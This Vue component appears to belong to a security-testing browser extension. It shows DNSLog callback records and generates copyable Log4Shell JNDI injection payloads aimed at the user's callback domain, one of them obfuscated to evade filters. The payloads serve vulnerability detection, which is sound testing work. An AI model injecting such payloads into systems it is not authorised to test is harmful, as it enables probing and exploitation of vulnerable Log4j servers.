<template>
  <div style="font-size: 12px!important;">
    <a-card :bordered="false" :body-style="{padding:0}" :header-style="{padding:0}">
      <template #title>
        <a-tag color="#722ed1">
          快捷方式
          <icon-code-square/>
        </a-tag>
      </template>
      <a-space direction="vertical" fill>
        <a-tag v-for="action in quickActions" :key="action" v-on:click="copy(action);$message.success('复制成功')">
          {{ action }}
          <icon-copy style="margin-left: 5px"/>
        </a-tag>
      </a-space>
    </a-card>
    <a-card :bordered="false" :body-style="{padding:0}" :header-style="{padding:0}">
      <template #title>
        <a-tag color="#722ed1" v-on:click="copy(accountSuffix);$message.success('复制成功')">{{ accountSuffix }}
          <icon-copy style="margin-left: 5px"/>
        </a-tag>
      </template>
      <a-alert banner>记录自动刷新，只展示最近20条</a-alert>
      <a-timeline>
        <a-timeline-item v-for="record in results" :key="record.name+record.add_time"
                         :label="getTsTime(record.add_time)">{{ record.name }}
        </a-timeline-item>
      </a-timeline>
      <a-result
          v-if="error"
          status="403"
          :subtitle="error"
      >
        <template #extra>
          <a-space>
            <a-button type="primary">请检查配置是否正确</a-button>
          </a-space>
        </template>
      </a-result>
    </a-card>
  </div>
</template>

<script>
import {getRecords} from '@/api/dnslog';
import {getBaseUrl} from "@/utils/biu";

export default {
  name: 'DNSLog',
  props: {},
  data() {
    return {
      baseUrl: getBaseUrl(),
      error: false,
      loading: false,
      accountSuffix: '',
      results: []
    }
  },
  computed: {
    quickActions() {
      const actions = [];
      actions.push('${jndi:dns://log' + this.accountSuffix + ':53/abc}');
      actions.push('${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://log' + this.accountSuffix + ':53/abc}');
      return actions
    }
  },
  mounted() {
    this.handleGet();
    this.Interval = setInterval(() => {
      this.handleGet();
    }, 2000);
  },
  beforeUnmount() {
    clearInterval(this.Interval);
  },
  methods: {
    openUrl(url) {
      this.chrome.tabs.create({url: url});
    },
    handleGet() {
      if (!this.error) {
        this.loading = true;
        this.error = false;
        getRecords({limit: 20}).then(response => {
          this.results = response.data.result;
          this.accountSuffix = response.data.dns;
          this.loading = false;
        }).catch(error => {
          this.error = error
        })
      }
    }
  }
}
</script>

<!-- Add "scoped" attribute to limit CSS to this component only -->
<style scoped>

a {
  color: #42b983;
}
</style>
